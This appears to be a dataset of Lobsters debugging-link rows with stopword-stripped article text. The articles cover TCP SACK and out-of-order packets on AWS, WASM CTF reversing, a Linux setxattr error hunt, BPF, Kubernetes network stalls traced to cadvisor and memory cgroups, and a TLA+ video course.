retransmissions transfer would see thousand outoforder packet causing thousand retransmissions even though seeing outoforder packet u region retransmissions compounded increased round trip time uswest region much worse useast region tshark r q z io count tcpanalysisretransmission tcpanalysisretransmission count tcpanalysisduplicateack tcpanalysisduplicateack count tcpanalysislostsegment tcpanalysislostsegment count tcpanalysisfastretransmission tcpanalysisfastretransmission count tcpanalysisoutoforder tcpanalysisoutoforder running user root group root could dangerous io statistic duration sec interval sec col count tcpanalysisretransmission tcpanalysisretransmission count tcpanalysisduplicateack tcpanalysisduplicateack count tcpanalysislostsegment tcpanalysislostsegment count tcpanalysisfastretransmission tcpanalysisfastretransmission count tcpanalysisoutoforder tcpanalysisoutoforder interval count count count count count dur interesting see thousand ouroforder packet transversing direct connection however going public internet retransmissions outoforder packet brought finding aws support internal team reported back outoforder packet bug issue aws networking general outoforder packet common network clear u outoforder packet something deal going continue use direct connection order order whole network order thankfully tcp tool better handling dropped outoforder packet selective acknowledgement sack tcp feature allows receiver acknowledge nonconsecutive data sender retransmit missing packet outoforder packet sack nothing new enabled modern operating system look far found sack disabled host back june detail sack panic released group vulnerability allowed remotely triggered denialofservice kernel panic occur linux freebsd system testing benefit enabling sack immediately apparent outoforder packet still exist cause cascade retransmissions upload time time faster sack disabled exactly needed irb main region user system total real solution would simple reenabling sack majority host newenough kernel sack panic patch place host could upgrade running vulnerable kernel version solution use iptables block connection low ms value block allowed sack enabled still blocking attack iptables input p tcp tcpmss ms j drop almost month backandforth aws support get indication packet horribly order thanks detective work helpful tool sack able address problem
124,Lobsters,debugging,Debugging,Reversing Web Assembly (WASM),https://anee.me/reversing-web-assembly-wasm-dd59eb2a52d4,reversing web assembly wasm,reversing web assembly wasm xmasfuture kib,reversing web assembly wasm challenge flagcheckingservice written web assembly flag must format hxp goal guess correct flag hosted challenge local setup used nginx made sure wasm file served correct mimetypexmasfutureby benediktwernermost people give present christmas hxp give glorious futureif confused simply extract flag 山葵 shall understand kib reverse wasmthe challenge flagcheckingservice web assembly flag must format hxp goal guess correct flag hosted challenge local setup used nginx made sure wasm file served correct mimetypeserver listen defaultserver listen defaultserver location type defaulttype applicationwasm addheader xrobotstag noindex follow allow u instantiate streaming use chrome debugger stack variable call stack memory information disposali hosted challenge try along likecheck jsthe correct flag compared input javascript check function pass input wasm call method wasm namespace exploring wasm method found couple interesting like one wasm checkwe set breakpoint start executing test flag hxp checkthis
125,Lobsters,debugging,Debugging,PoSD 2: What causes insidious bugs?,https://chelseatroy.com/2019/12/30/posd-2-what-causes-insidious-bugs/,posd cause insidious bug,john ousterhout last post fundamentally misunderstand bug spent three hour think need one coining term debugging entomology let start chapter posd choosing name good name critical damn hard reflexively assumed origin bug reason insidious bug come inaccurate assumption insidiousness bug come inaccurate assumption post piece refactoring encoding assumption happen code either high risk assumption exactly find prevent insidious little bug liked piece might also like leveling series book category history api design series like,reading time minutesi recently read john ousterhout book philosophy software design posd blog post includes commentary part stuck last post talked eschewing complexity handling special case example choice software literature post little detective work book never directly discus debugging see pattern fundamental software development literature think understand programmer think bug exceptional unique detour normal workflow shipping functional code fundamentally misunderstand bug debugging exception normal suspect rather spend time reading error message combing code determine something working last week spent three hour three programmer take practice occupies majority work time make harder treating exception unified praxis pedagogy debugging think need one instead build anecdotal library bug individually seen think waste going start writing debugging like pay homage late grace hopper coining term bug make post topic available category debugging also tag entomology biologist refer study want explore philosophy software design teach u building framework understanding preventing solving bug let start chapter posd choosing name programmer tend agree name thing important also difficult good name critical damn hard check excerpt book ousterhout writes challenging bug john ousterhout ever fixed came poor name choice file system code used variable name block two different purpose situation block referred physical block number disk situation block referred logical block number within file unfortunately one point code blockvariable containing logical block number accidentally used context physical block number needed result unrelated block disk got overwritten zero tracking bug several people including read faulty code never noticed problem saw variable block used physical block number reflexively assumed emphasis chelsea troy really held physical block number origin bug tracked bug two recorded rigorously enough make scientific case noticed something longer spend chasing likely becomes fix oneliner time sunk four hour almost guaranteed oneliner used think kind psychological bias way ever seems rain pack umbrella see happens reason insidious bug come inaccurate assumption bolded text reflexively assumed example insidious bug come inaccurate assumption deeper insidiousness characteristic bug come inaccurate assumption looking code problem rooted understanding take awfully long time find something looking wrong place name thing encoding understanding creating understanding true freaky degree talked post name thing shape understand also name thing influenced understand hard u detect assumption system wrong hard u detect making assumption assumption definition describe thing taking granted include detail putting thought talked assumption detection piece refactoring believe improving ability detect question assumption play critical role solving existing insidious bug preventing future one encoding assumption happen code either chapter posd discus code comment programmer sometimes advise write comment favor focusing legibility code experience work right relinquish full control apis use happens way moment include even single library dependency another set programmer different perspective frequently make different assumption could go back time inject lesson paragraph every code base ever seen fewer gray hair precision useful commenting variable declaration class instance variable method argument return value name type variable declaration typically precise comment fill missing detail unit variable boundary condition inclusive exclusive null value permitted imply variable refers resource must eventually freed closed responsible freeing closing certain property always true variable invariant list always contains least one entry information point example high risk assumption thing know one way programmer going think know way going think high risk assumption make great hiding place bug exactly find prevent insidious little bug philosophy software design directly say however provides robust framework solving different kind problem repurpose finding insidious bug talk next post mean tease try keep post word respect time energy right mother entomologist normal biology kind father engineer series seems like one fated heritage write liked piece might also like leveling series perpetual favorite gearheads like book category slowly adding blog post reflected book history api design series prepare sacred cow threatened like like loading
126,Lobsters,debugging,Debugging,PFAB#6: Real-world debugging practice,https://robertheaton.com/2019/12/28/pfab6-real-world-debugging-practice/,pfab realworld debugging practice,subscribe short guide scientific debugging something bug let know blank board programming project advanced beginner tictactoe click solution search result click solution power battle click solution let know,post part programming feedback advanced beginner series help make leap knowing syntax writing clean elegant code subscribe receive pfab inbox every weekend entirely free half programming writing code half figuring code written god damn work post contains excerpt realworld program reader sent asking assistance figuring code broken task find bug fix bugsquashes great practice thinking methodically understanding code originally write need setup order tackle even run code directly browser start stepbystep whirlwind guide like call scientific debugging short guide scientific debugging unscientific debugging typically mean alternating sitting perfectly still staring screen waiting divine inspiration strike flailing around trying semirandom change rarely actually summoned heaven contrast scientific debugging mean forming explicit hypothesis wrong code may well wrong systematically trying prove disprove repeating process taking inexorably closer closer cure debug scientifically start writing short snippet test code precisely verifies whether code behaving correctly make easy test bugfixes example bug added test snippet possible form hypothesis think might problem wonder forgetting subtract length array feeling especially rigorous write hypothesis take note throughout entire process able form hypothesis work prove disprove example hypothesis correct code work input break add print statement variable none able prove hypothesis correct use new knowledge fix code rerun test case step pass verify code work test case ensures introduced new bug missed even subtler edgecases hand investigation instead disprove hypothesis still great progress understand code better know something wrong try use new knowledge form new hypothesis loop process forever find answer give ask friend point able come new hypothesis think wrong literally idea add printstatements code order better understand going inside form microhypotheses think internals code working believe point code firstname robert prove disprove hypothesis huh actually obert use new knowledge form hypothesis larger problem seeing ohhh bet accidentally chopping first character every input would explain find user database prove disprove repeat talk much detail scientific debugging future pfabs including example common pattern something wrote year ago today bug bug bug written python concept entirely generic bug logic mistake could easily accidentally write almost language need know anything esoteric python syntax order tackle bug order print variable x terminal write print x fix bug get stuck question suggestion please let know love hear blank board bug sent someone working programming project advanced beginner tictactoe trying write function would generate return blank tictactoe board something going wrong see figure view run edit code browser click def blankboard width height function return array use represent board game like tictactoe battleship using array see http http http board row range height range width rowappend none boardappend row return board name main testboard blankboard expectedboard none none none none none none none none none none none none todo look like bug blankboard generating function figure fix test pass testboard expectedboard print test passed else print test failed solution search result bug sent someone trying programatically query online search engine multiple search term combine result single array thing going well view run edit code browser click def searchall query allresults q query result search q allresultsappend result return allresults def search query function fake search engine use make bugsquashing exercise concise original program function queried internet search engine return fake search result appending given query example query banana return note using fake function simplify program testing debugging cheating common sensible technique result range resultsappend query str return result name main testqueries cat dog mouse testresults searchall testqueries expectedresults todo look like bug searching function figure fix test pass testresults expectedresults print test passed else print test failed solution power battle finally bug sent someone building commandline adventure game thing going well player losing battle losing find save day view run edit code browser click extrapowerneededtodefeatenemy def playerhasenoughpowertodefeatenemy playerstats enemystats subtract enemy power player power make sure difference playerstats power playerstats power enemystats power playerstats power extrapowerneededtodefeatenemy return true else return false name main game player defeat enemy greater power enemy playerstats name horatio power name death face power name brain eater power todo since player extra power death face brain eater expect defeat enemy however happening figure bug fix playerhasenoughpowertodefeatenemy playerstats print player defeat enemy else print player loses enemy exit playerhasenoughpowertodefeatenemy playerstats print player defeat enemy else print player loses enemy exit solution finished let know addition
127,Lobsters,debugging,Debugging,Dissecting Linux Kernel Code,https://finnoleary.net/kernel-code.html,dissecting linux kernel code,back dissecting linux kernel code syscall nt give error code linuxman patch add erange error section,back dissecting linux kernel code syscall nt give error code testing koios came across error triggering asked koios create initialization file temporary mount point following invocation koios init causing koios trigger error unable generate config file setting extended attribute failed result representable well hmm setting extended attribute failed error code kerrsetxat two place trigger kerrsetxat one place config generation trigger spamming surrounding printfs unfortunately gdb let u watch errno running mk dotest see errno line errno line errno line errno line errno line errno line unable generate config file setting extended attribute failed result representable cursory investigation show u two errno value get one serious expected natural part functioning program le usrincludeasmgenericerrnoh define enodata data available le usrincludeasmgenericerrnobaseh define erange math result representable hold math result nt math call trigger let look line give u error setxat koiostestfile koiostestattr bp n seems normal setxat wrapper wrote handle linux osx syscalls nt dark magic cursory scan grep manual page setxattr show mention erange error however mention share error code stat stat unfortunately listed produce erange error code going well linux kernel code computer let investigate short poke around using grep seems likely candidate syscall setxattr line fsxattrc list line number want read full code along linux kernel version well hold immediately notice mention erange error strncpyfromuser kname name sizeof kname error error sizeof kname error erange error return error ok well kname defined char kname xattrnamemax xattrnamemax quick grep defined define xattrnamemax let recompile check length name passing make sure hitting limit strlen name hmm ok point time decided backpedal check assumption given compiling musl wonder anything weird luckily enough copy musl source computer time dug dns name resolution routine grep reveals setxattr defined srclinuxxattrc let take look int setxattr const char path const char name const void value sizet size int flag return syscall syssetxattr path name value size flag oh ok assumption right go straight system call next let figure function get called le another grep find u setxattr const char user pathname let take look setxattr const char user pathname const char user name const void user value sizet size int flag return pathsetxattr pathname name value size flag lookupfollow point moved cscope make easier track definition sake prosperity invoking like cscope c h c h c h also decided go function function figure part called pathsetxattr could possibly return erange wo nt make bored lazily reusing sentence structure grepped x showed made grep z showed instead nice handwritten tree call return erange note pathsetxattr userpathat userpathatempty filenamelookup pathlookupat handlelookupdown followmanaged dmanage autofsdmanage autofsmountwait autofswait validaterequest followautomount dautomount finishautomount doaddmount lockmount getmountpoint dsetmounted grafttree attachrecursivemnt countmounts inventgroupids mntallocgroupid idaallocmin idaallocrange xaserror xaerr xaiserr nt seem propagatemnt propagateone countmounts linkpathwalk maylookup inodepermission sbpermission doinodepermission permission fusepermission fusedogetattr fusesimplerequest fusegetreq fusegetreq fuserequestalloc fuserequestalloc kmemcachezalloc kmemcachealloc doc state return null pointer point decided stop tree genericpermission aclpermissioncheck checkacl posixaclpermission fuseaccess fusesimplerequest explored elsewhere fusepermgetattr explored elsewhere genericpermission explored elsewhere devcgroupinodepermission devcgroupcheckpermission devcgroupcheckpermission securityinodepermission callinthook dhash could nt find fuse handler one line fsdcachec nt return error whatsoever though walkcomponent handledots followdotdotrcu followdotdot pathparentdirectory lookupfast drevalidate drevalidate fusedentryrevalidate fusesimplerequest explored elsewhere followmanaged explored elsewhere stepinto picklink ndallocstack ndallocstack lookuplast listentry probably return pointer invalid value going null completewalk dweakrevalidate probably ca nt find valid fuse value mntwantwrite mntwantwrite setxattr yes strncpyfromuser dostrncpyfromuser capconvertnscap vfssetxattr xattrpermission inodepermission explored elsewhere securityinodesetxattr seems two version callinthook inodesetxattr selinuxinodesetxattr capinodesetxattr dentryhasperm inodehasperm avchasperm avchaspermnoaudit avcdenied avcaudit slowavcaudit avchasperm explored elsewhere securitycontexttosid securitycontexttosidcore stringtocontextstruct mlscontexttosid mlscontextcpy ebitmapcpy ebitmapsetbit sidtabcontexttosid sidtabreverselookup sidtabrcachesearch sidtabfindcontext sidtabfindcontext contextcpy mlscontextcpy ebitmapcpy func convert func could nt find assigned securitycontexttosidforce securitycontexttosidcore explored elsewhere securityvalidatetransition securitycomputevalidatetrans securityvalidtranshandlefail smackinodesetxattr smkcuracc smktskacc smkaccess smkbuinode imainodesetxattr imaprotectxattr evminodesetxattr evmprotectxattr securityinodesetxattr capinodesetxattr explored elsewhere vfssetxattrnoperm vfssetxattr return result handler xattrresolvename return fusexattrhandlers another handler fusexattrhandlers get fusexattrget fusegetxattr fusesimplerequest explored elsewhere mint set fusexattrset fuseremovexattr fusesimplerequest explored elsewhere fusesetxattr fusesimplerequest explored elsewhere securityinodesetsecurity hookinodesetsecurity selinuxinodesetsecurity securitycontexttosid explored elsewhere unfortunately see completed call graph look like two place return erange sure meeting condition either however rereading fusesimplerequest noticed possibility returned req outherror figured perhaps somewhere along line herror getting set erange however rough search came negative next approach originally trying avoid adding debugging statement kernel recompiling trying avoid old take hour compile kernel scratch bright side managed use time organize sheet music nt complete loss adding debug statement see entered pathsetxattr userpathat returned error mntwantwrite returned error setxattr returned error returning error setxattr return erange one condition pretty sure hitting added debugging statement well entered pathsetxattr userpathat returned error mntwantwrite returned error entered setxattr returning einval strncpyfromuser returned error nt trigger return error condition either entered vfssetxattr xattrpermission returned error securityinodesetxattr returned error vfssetxattrnoperm returned error vfssetxattr returned error setxattr returned error returning error hmm information still great see hitting erange condition setxattr excerpt next log adding printks see whatever handler choosing returning error securityinodesetxattr returned error entered vfssetxattrnoperm entered vfssetxattr handler set returned error vfssetxattr returned error given fusexattrhandlers return erange assume assumption handler returned wrong let verify adding pf elinux debugging printing guide tell print symbol name pointer value handler chosen ok information let another deep dive handler defined structure xattruserc const struct xattrhandler prefix xattruserprefix list get set simple passthrough contain value erange huzzah defined line erange mention come pretty early namelen strlen name namelen valuelen sb sblocksize return erange hmmm according documentation man setxattr returning enospc ca nt store xattr enospc insufficient space remaining store extended attribute would also probably make sense return something like enametoolong error setxattr listed capable returning share error code stat general case propose patch bring kernel line documentation instead bring doc line kernel actual behavior well let base example looking handler see also return erange name long strlen name return erange additionally appears inline documentation return enospc valuelen big exact code path kind convoluted wo nt represent entirely could mistaken section code handle credit error enospc goto cleanup given clearly handler return erange paired fact keep thing stable userspace probably better submit documentation fixing rather attempting patch erange unfortunately threeday journey culminated following message manpages mailing list linuxman patch add erange error section simple fix libkoios errno enospc errno enospc errno erange
129,Lobsters,debugging,Debugging,BPF: A New Type of Software,http://www.brendangregg.com/blog/2019-12-02/bpf-a-new-type-of-software.html,bpf new type software,ubuntu master youtube slideshare bpf performance tool invent,netflix bpf program running cloud server default facebook program process kernel module nt appear traditional observability tool new type software make fundamental change old kernel model introducing new interface application make kernel request alongside syscalls bpf originally stood berkeley packet filter extended linux become generic kernel execution engine capable running new type userdefined kernelmode application bpf really described first time ubuntu master keynote video youtube video slide slideshare bpf performance tool book released ebook cover one use case bpf observability also speaking topic invent week well see bpf biggest operating system change seen career thrilling part thanks canonical inviting speak first ubuntu master event
131,Lobsters,debugging,Debugging,Troubleshooting with Wireshark: The Case of the TCP Challenge ACK,https://www.networkdefenseblog.com/post/wireshark-tcp-challenge-ack,troubleshooting wireshark case tcp challenge ack,,contact meprofessional personal consulting volunteering use form drop linecopy write brandon hitzel site work progress best viewed desktop
132,Lobsters,debugging,Debugging,Your Debugger Sucks,https://robert.ocallahan.org/2019/11/your-debugger-sucks.html,debugger suck,author note pernosco tl dr rr pernosco,author note unfortunately tweet blog oldhat theme like c suck lol get lot traffic message pernosco think much interesting important relatively little exposure troll time tl dr debugger suck using debugger suck suck nt use interactive debugger probably debug adding logging code rebuildingrerunning program give view happens time slow take many iteration limited dumping easily accessible state certain program point suck use traditional interactive debugger suck different way spend lot time trying reproduce bug locally attach debugger even though many case bug already reproduced people ci test suite reproduce problem many time iteratively narrow cause often debugger interferes code test problem nt show way expect debugger let inspect current state program stop selected program point nt track data control flow remember much happened past pretty much stuck debugging real support collaboration recording discovered use cuttingedge record replay debugger like rr suck le reproduce bug recording process probably le invasive reverseexecute much natural debugging experience however still hard collaborate interactive response slow feature set mostly limited interface traditional debugger even though much information available hood frankly still suck software developer company everywhere sad better way debug leaving lot productivity therefore money table mention making developer miserable mentioned debugging suck debugging important nt people built better tool theory think biggest reason developer suck particular developer culture developer nt pay tool especially debugger always free therefore noone want pay even would credibly save far money cost lost count number people told never make money selling debugger sure wrong therefore noone want invest indeed historically investment debugging tool extremely low far know way fix situation building tool much better free tool absurdity refusing pay overwhelming expectation shift another important factor stagnation debugging technology stunted imagination developer tool builder people still never even heard anything better traditional stopandinspect debugger course interested new debugging technology expect better cure see push harder promulgation better tool raise expectation cathartic rant course ultimate point something positive pernosco tackle debugger pitfall mentioned attempt build absurdly better tool change culture expectation want everyone know pernosco attract customer need sustainable debugging investment developer everywhere wake awful state debugging rise demand end
133,Lobsters,debugging,Debugging,Debugging network stalls on Kubernetes,https://github.blog/2019-11-21-debugging-network-stalls-on-kubernetes/,debugging network stall kubernetes,kubernetes vegeta removing complexity find path fault overlay network ipip network address translation nics deep dive linux kernel packet processing interrupt napi software interrupt context narrow processing core method bcc icmpecho bcc script cadvisor cadvisor stall thing brendan gregg flamegraph cause read slow excessive cpu usage problem wrapping,talked kubernetes last couple year become standard deployment pattern github run large portion internal publicfacing service kubernetes kubernetes cluster grown target latency service become stringent began notice certain service running kubernetes environment experiencing sporadic latency attributed performance characteristic application essentially application running kubernetes cluster would observe seemingly random latency connection would cause downstream timeouts retries service expected able respond request well feasible connection taking long separately also observed fast mysql query expected take matter millisecond mysql observed taking millisecond observed taking perspective querying application problem initially narrowed communication involved kubernetes node even side connection outside kubernetes simple reproduction vegeta benchmark could run internal host targeting kubernetes service running node port would observe sporadically high latency post walk tracked underlying issue removing complexity find path fault using example reproduction wanted narrow problem remove layer complexity initially many moving part flow vegeta pod running kubernetes determine deeper network problem needed rule client vegeta creates tcp connection kubenode cluster kubernetes run data center overlay network network run top existing datacenter network us ipip encapsulates overlay network ip packet inside datacenter ip packet connection made first kubenode performs stateful network address translation nat convert kubenode ip port ip port overlay network specifically pod running application return undoes step complex system lot state lot moving part constantly updating changing service deploy move around part running tcpdump original vegeta benchmark observed latency tcp handshake syn synack simplify complexity http vegeta use ping syn packet see observe latency response throw away connection filter include packet get simpler reproduction case full layer vegeta benchmark attack service following ping kubenode using tcp synsynack node port service interval filtered slow response theojulienne shell sudo p egrep linebuffered rtt df flagssa m df flagssa m df flagssa m df flagssa m df flagssa m df flagssa m first new observation sequence number timing oneoff often grouped like backlog eventually get processed next want narrow component potentially fault kubeproxy iptables nat rule hundred rule long ipip tunnel something network handling poorly one way validate test step system happens remove nat firewall logic use ipip part linux thankfully let talk directly overlay ip machine part network pretty easy theojulienne kubenodeclient sudo egrep linebuffered rtt df flagsra m df flagsra m df flagsra m based result problem still remains rule iptables nat tcp problem let see happens perform normal icmp ping theojulienne kubenodeclient sudo icmp egrep linebuffered rtt m m m m m m m m m m result show problem still exists ipip tunnel causing problem let simplify thing possible every packet two host theojulienne kubenodeclient sudo icmp egrep linebuffered rtt m m m m m m m m m behind complexity simple two kubenode host sending packet even icmp ping still see latency target host bad one worse others one last thing question clearly observe everywhere kubenode server occur kubenode sender receiver luckily also pretty easy narrow using host outside kubernetes sender known bad target host staff shell host kubenode observe still issue direction theojulienne shell sudo p egrep linebuffered rtt df flagsra m df flagsra m df flagsra m df flagsra m perform previous source kubenode staff shell host rule source host since ping rx tx component theojulienne kubenodeclient sudo p egrep linebuffered rtt c hping statistic packet transmitted packet received packet loss roundtrip minavgmax m looking packet capture latency observed get information specifically sender host bottom observes timeout receiver host top delta column second additionally looking difference ordering packet based sequence number receiver side tcp icmp result observe icmp packet always arrive sequence sent uneven timing tcp packet sometimes interleaved subset stall notably observe count port syn packet port order receiver side order sender side subtle difference modern server data packet containing tcp v icmp packet arrives nic hash packet per connection try divvy connection across receive queue approximately delegated given cpu core tcp hash includes source destination ip port word connection hashed potentially differently icmp ip source destination hashed since port another new observation tell icmp observes stall communication two host period sequence number icmp v tcp tcp tell u rx queue hashing likely play almost certainly indicating stall processing rx packet sending response rule kubenode transmits know stall processing packet receive side kubenode server deep dive linux kernel packet processing understand problem could receiving side kubenode server let take look linux kernel process packet going back simplest traditional implementation network card receives packet sends interrupt linux kernel stating packet handled kernel stop work switch context interrupt handler process packet switch back context switching slow may fine nic modern server nic maximal line rate bring around million packet per second smaller server eight core could mean kernel interrupted million time per second per core instead constantly handling interrupt many year ago linux added napi networking api modern driver use improved performance high packet rate low rate kernel still accepts interrupt nic method mentioned enough packet arrive cross threshold disables interrupt instead begin polling nic pulling packet batch processing done softirq software interrupt context happens end syscalls hardware interrupt time kernel opposed userspace already running much faster brings another problem happens many packet process spend time processing packet nic never time let userspace process actually drain queue read tcp connection etc eventually queue would fill start dropping packet try make fair kernel limit amount packet processed given softirq context certain budget budget exceeded wake separate thread called ksoftirqd see one p core process softirqs outside normal syscallinterrupt path thread scheduled using standard process scheduler already try fair overview way kernel processing packet see definitely opportunity processing become stalled time softirq processing call grows packet could sit nic rx queue processed could something deadlocking cpu core could something slow preventing kernel running softirqs narrow processing core method point make sense could happen know observing something look lot like next step confirm theory understand causing let revisit slow round trip packet saw m m m m m m m m discussed previously icmp packet hashed single nic rx queue processed single cpu core want understand kernel helpful know cpu core softirq ksoftirqd processing packet catch action time use tool allow live tracing running linux used allows write small c program hook arbitrary function kernel buffer event back userspace python program summarize return hook arbitrary function kernel difficult part actually go way safe possible use designed tracing exactly type production issue simply reproduce testing dev environment plan simple know kernel processing icmp ping packet let hook kernel function icmpecho take incoming icmp echo request packet initiate sending icmp echo response reply identify packet using incrementing icmpseq shown code bcc script look complex breaking scary sound icmpecho function passed struct skbuff skb packet containing icmp echo request delve live pull echosequence map icmpseq shown send back userspace conveniently also grab current process nameid well give u result like following live kernel process packet tgid pid process name icmpseq prometheus spokesreports one thing note process name postsyscall softirq context see process made syscall show process even though really kernel processing safely within kernel context running correlate back stalled packet observed process handling simple grep capture icmpseq value context show happened packet processed packet line icmpseq value marked along rtt observed expected rtt filtered tgid pid process name icmpseq rtt cadvisor cadvisor cadvisor cadvisor result tell u thing first packet processed conveniently tell u particular pair machine icmp packet hashed core receiving side also see every time see stall always see packet processed cadvisor syscall softirq context followed ksoftirqd taking processing backlog exactly number expect work backlog fact cadvisor always running prior immediately also implicates problem ironically cadvisor analyzes resource usage performance characteristic running container yet triggering performance problem many thing related container relatively bleedingedge tooling result somewhat expected corner case bad performance cadvisor stall thing understanding stall happen process causing cpu core happening pretty good idea look like kernel hard block schedule ksoftirqd earlier given see packet processed cadvisor softirq context likely cadvisor running slow syscall end rest packet processed theory validate actually happening one thing trace running cpu core throughout process catch point packet overflowing budget processed ksoftirqd look back bit see running cpu core think like taking xray cpu every millisecond would look something like conveniently something already mostly supported perf record tool sample given cpu core certain frequency generate call graph live system including userspace kernel taking recording manipulating using quick fork tool brendan gregg flamegraph retained stack trace ordering get oneline stack trace sample get sample ksoftirqd trace record time second every offset align exactly timer sudo perf record c g f take recording make simpler stack trace sudo perf script devnull flamegraphstackcollapseperforderedpl grep ksoftir b result following hundred trace look similar cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor sysread vfsread seqread memcgstatshow memcgroupnrlrupages memcgroupnodenrlrupages cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor sysread vfsread seqread memcgstatshow memcgroupnrlrupages memcgroupnodenrlrupages cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor sysread vfsread seqread memcgstatshow memcgroupiter cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor sysread vfsread seqread memcgstatshow memcgroupnrlrupages memcgroupnodenrlrupages cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor cadvisor sysread vfsread seqread memcgstatshow memcgroupnrlrupages memcgroupnodenrlrupages retfromfork kthread kthread smpbootthreadfn smpbootthreadfn runksoftirqd dosoftirq netrxaction ixgbepoll ixgbecleanrxirq napigroreceive netifreceiveskbinternal inetgroreceive bondhandleframe netifreceiveskbcore iprcvfinish iprcv ipforwardfinish ipforward ipfinishoutput nfiterate ipoutput devqueuexmit devhardstartxmit ipiptunnelxmit iptunnelxmit iptunnelxmit iplocalout dstoutput iplocalout nfhookslow nfiterate nfconntrackin genericpacket iptdotable ipsettest ixgbexmitframering swiotlbdmamappingerror retfromfork kthread kthread smpbootthreadfn smpbootthreadfn runksoftirqd dosoftirq netrxaction grocellpoll napigroreceive netifreceiveskbinternal inetgroreceive netifreceiveskbcore iprcvfinish iprcv ipforwardfinish ipforward ipfinishoutput nfiterate ipoutput devqueuexmit devhardstartxmit devqueuexmitnit packetrcv tpacketrcv schdirectxmit validatexmitskblist validatexmitskb netifskbfeatures ixgbexmitframering swiotlbdmamappingerror devqueuexmit devhardstartxmit bpfprogrun bpfprogrun lot looking see cadvisorthenksoftirqd pattern saw icmp tracer mean line trace cpu point time call stack separated line looking middle line see syscall called read sysread cadvisor spending lot time read syscall relating memcgroup function top call stack end line call stack trace convenient see read let use strace see cadvisor find syscalls theojulienne kubenodebad sudo strace p ff egrep pid futex resumed pid futex resumed pid futex resumed pid futex resumed pid read resumed cache pid futex resumed pid futex resumed pid read resumed cache pid read resumed cache pid epollctl resumed pid resumed timeout pid read resumed cache pid futex resumed pid futex resumed pid futex resumed pid read resumed cache sure enough see slow read call content read memcgroup context read call memorystat file show memory usage limit cgroup resource isolation technology used docker cadvisor polling file get resource utilization detail container let see kernel cadvisor something unexpected attempting read theojulienne kubenodebad time cat sysfscgroupmemorymemorystat devnull real user sys theojulienne kubenodebad since reproduce indicates kernel hitting pathologically bad case cause read slow point much simple find similar issue reported others turn reported cadvisor excessive cpu usage problem observed latency also introduced network stack randomly well fact folk internally noticed cadvisor consuming cpu expected seem causing issue since server plenty cpu capacity cpu usage yet investigated overview issue memory cgroup accounting memory usage inside namespace container process cgroup exit memory cgroup released docker however memory process memory although process memory usage gone turn kernel also assigns cached content like dentries inodes directory file metadata cached memory cgroup issue zombie cgroups cgroups process deleted still memory charged case dentry cache could also page cache tmpfs rather kernel iterating every page cache cgroup release time could slow choose wait page reclaimed finally clean cgroup reclaimed memory needed lazily meantime cgroup still need counted stats collection performance perspective trading time slow process amortizing reclamation page opting make initial cleanup fast return leaving cached memory around fine kernel reclaims last cached memory cgroup eventually get cleaned really leak unfortunately search memorystat performs way implemented kernel version running server combined huge amount memory server mean take significantly long time last cached data reclaimed zombie cgroup cleaned turn node large number zombie cgroups readsstalls second workaround cadvisor issue immediately free dentriesinodes cache systemwide immediately stopped read latency also network latency stall host since dropping cache included cached page zombie cgroups also freed solution validate cause issue turn newer kernel release improved performance memorystat call longer problem moving kernel interim existing tooling able detect problem node kubernetes cluster gracefully drain reboot used detect case high enough latency would cause issue treat graceful reboot gave u breathing room o kernel upgrade rolled remainder fleet wrapping since problem manifested nic rx queue processed hundred millisecond responsible high latency short connection latency observed midconnection mysql query response packet understanding maintaining performance foundational system like kubernetes critical reliability speed service build top invest improve performance every system run benefit improvement
134,Lobsters,debugging,Debugging,TLA+ Video Course by Leslie Lamport,https://lamport.azurewebsites.net/video/videos.html,tla video course leslie lamport,tla video course lecture web version correction video file zip file script web version video file zip file script web version correction video file zip file script web version video file zip file script web version correction video file zip file script web version correction video file zip file script web version video file zip file script web version correction video file zip file script web version video file zip file script web version video file zip file script web version correction video file zip file script web version video file zip file script web version video file zip file script downloading instruction,tla video course last modified july series video lecture teach programmer software engineer write tla specification assumes basic understanding programming concept knowledge elementary mathematics might taught beginning university math course computer scientist would also helpful word warning video light entertainment require careful viewing actual thinking may often stop video digest seen perhaps skip back view accompany video coffee better popcorn lecture watched web however people slow network connection might prefer download lower resolution version video watch offline instruction given script video also provided contains everything shown said video except shot author hearing impaired viewer fluent english find helpful read script watch video script also read instead watching video want review lecture hate video however html file display video may needed download material lecture introduction tla explains tla might want use introduces concept state machine length web version correction offline version video file zip file script state machine tla show simple state machine described tla giving first glimpse tla specification length web version offline version video file zip file script resource tool describes resource learning tla explains download toolbox show use open spec view prettyprinted version run tlc script display said portion video demonstrate use toolbox length web version correction offline version video file zip file script die hard save life two hollywood action hero way start learning write tla spec checking parser tlc length web version offline version video file zip file script transaction commit commitment marriage database transaction specified also learn use mathematical function specification length web version correction offline version video file zip file script twophase commit commitment achieved marriage database transaction also learn record tla using tlc length web version correction offline version video file zip file script paxos commit specifies real faulttolerant algorithm committing database transaction explains mathematical operation constructing combining set length web version offline version video file zip file script implementation twopart lecture introduces temporal formula explains mean one specification implement another length part part part preliminary web version correction offline version video file zip file script part work web version offline version video file zip file script alternating bit protocol twopart lecture explains liveness describes must happen fairness part high level specification web version offline version video file zip file script length part protocol web version correction offline version video file zip file script length implementation refinement twopart lecture explains general meaning implementation involves refinement mapping part preliminary web version offline version video file zip file script length part refinement mapping web version offline version video file zip file script length downloading instruction watching lecture offline download tlavideofileszip extract content folder let suppose name folder tlalectures folder contain file tlastylescss tlavideojs folder dist watch lecture offline download lecture video file zip file first name folder tlalectures let suppose file named smandtlazip extract content smandtlazip folder tlalectures one extracted file named smandtlahtml lecture zip file contain file view video open web browser html file
